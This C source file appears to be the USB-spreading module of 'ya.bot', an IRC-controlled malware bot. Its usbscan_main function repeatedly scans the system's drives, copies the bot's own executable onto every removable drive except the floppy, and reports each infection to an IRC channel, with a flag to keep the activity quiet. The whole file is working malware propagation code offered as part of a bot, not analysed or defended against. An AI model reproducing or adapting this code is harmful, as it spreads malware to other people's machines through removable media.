/*  ya.bot  */

#include "..\bot\bot.h"

#ifndef NO_USBSCAN
DWORD WINAPI usbscan_main(LPVOID param)
{
	char *pszPointer, szDrives[1024], szFilePath[MAX_PATH], szNewPath[MAX_PATH];
	DWORD dwTime, dwType;
	SUsbScan s_us = *((SUsbScan *)param);

#ifndef NO_DEBUG
		debug_print("Starting USB scan thread, usbscan_main()");
#endif

		GetModuleFileName(NULL, szFilePath, sizeof(szFilePath) - 1);
	if ((!s_us.m_bSilent) && (s_us.m_bVerbose))
			irc_message(s_us.m_bsock, s_us.m_szAction, s_us.m_szDestination,
					(char *)string_usbscanstarted,
					CBLUE, string_replyusbscan, CEND, string_replydotbot,
					CBLUE, CEND, s_us.m_szFileName,
					CBLUE, CEND, s_us.m_nDelay,
					CBLUE, CEND, s_us.m_dwTime);
		dwTime = GetTickCount();
	while (TRUE)
	{
			GetLogicalDriveStrings(sizeof(szDrives) - 1, szDrives);
			pszPointer = szDrives;
		if (pszPointer)
		{
			while (*pszPointer)
			{
					dwType = GetDriveType(pszPointer);
				if (dwType == DRIVE_REMOVABLE)
				{
					if (lstrcmpi(string_usbscanfloppy, pszPointer) != 0)
					{
							strncpy(szNewPath, pszPointer, sizeof(szNewPath) - 1);
							strncat(szNewPath,
									s_us.m_szFileName,
									sizeof(szNewPath) - strlen(szNewPath) - 1);
						if (!file_exists(szNewPath))
						{
							if (!CopyFile(szFilePath, szNewPath, FALSE))
							{
								if ((!s_us.m_bSilent) && (s_us.m_bVerbose))
										irc_message(s_us.m_bsock,
												(char *)string_ircprivmsg, s_us.m_szResultChannel,
												(char *)string_usbscancopyfailed,
												CRED, string_replyusbscan, CEND, string_replydotbot,
												CBLUE, CEND, szNewPath,
												CBLUE, CEND, szFilePath);
							}
							else
							{
								if (!s_us.m_bSilent)
										irc_message(s_us.m_bsock,
												(char *)string_ircprivmsg, s_us.m_szResultChannel,
												(char *)string_usbscancopysuccessful,
												CGREEN, string_replyusbscan, CEND, string_replydotbot,
												CBLUE, CEND, szNewPath,
												CBLUE, CEND, szFilePath);
							}
						}
					}
				}
					pszPointer = &pszPointer[strlen(pszPointer) + 1];
			}
		}
		if ((GetTickCount() - dwTime) >= (s_us.m_dwTime * 60000))
				break;
			Sleep(s_us.m_nDelay * 1000);
	}
	if ((!s_us.m_bSilent) && (s_us.m_bVerbose))
			irc_message(s_us.m_bsock, s_us.m_szAction, s_us.m_szDestination,
					(char *)string_usbscanfinished,
					CBLUE, string_replyusbscan, CEND, string_replydotbot,
					CBLUE, CEND, (GetTickCount() - dwTime) / 60000,
					CBLUE, CEND, s_us.m_szFileName,
					CBLUE, CEND, s_us.m_nDelay);
		thread_remove(THREAD_USBSCAN);
		return 0;
}
#endif